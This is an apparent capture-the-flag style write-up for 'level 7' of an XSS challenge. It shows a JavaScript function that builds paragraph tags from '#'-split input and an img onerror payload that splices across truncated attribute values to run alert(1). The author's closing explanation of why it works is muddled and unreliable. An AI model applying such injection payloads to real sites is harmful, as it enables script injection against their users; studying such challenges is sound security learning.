# level 7

```js
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}   
```
This was the payload i used, ```"><img src=#"onerror='/*#"*/alert(1)'``` the final code would be as follows

```html
<p class="comment" title=""><img src="></p>
<p class="comment" title=""onerror='/*"></p>
<p class="comment" title=""*/alert(1)'"></p>
```
The error fires on the img tag but how does the error event handler on documents.p[1] get called, here the single qoute on the src attribute comments out the string so it's all a function of the img tag.


